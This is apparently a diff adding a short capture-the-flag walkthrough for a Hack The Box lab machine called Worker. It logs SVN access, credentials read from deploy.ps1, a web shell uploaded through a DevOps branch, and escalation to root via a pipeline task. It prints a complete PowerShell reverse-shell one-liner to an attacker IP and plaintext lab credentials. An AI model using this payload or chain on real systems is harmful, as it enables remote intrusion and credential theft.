@@ -1,0 +1,34 @@
+[+] Checked out SVN repo:
+  limitedeternity$ svn co svn://10.10.10.203 svn_repo
+
+[+] Hostname detected: dimension.worker.htb
+
+[+] Hostname extracted from moved.txt: devops.worker.htb
+
+[*] Auth required on devops.worker.htb
+
+[+] Found in .svn/deploy.ps1:
+$user = "nathen" 
+$plain = "wendel98"
+
+[+] Authorized on devops.worker.htb as nathen
+
+[+] Created new branch "htb-fuckup"
+
+[+] Uploaded shell.aspx there and merged to "master".
+
+[+] Ran the powershell payload:
+
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.12',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+[+] W:\svnrepos\www\conf\passwd contains credentials!
+
+[+] Connected using Evil-WinRM as robisl.
+
+[+] Got user.txt.
+
+[+] Authorized on devops.worker.htb as robisl.
+
+[+] Created a pipeline with powershell payload as a task.
+
+[+] Got root.txt.
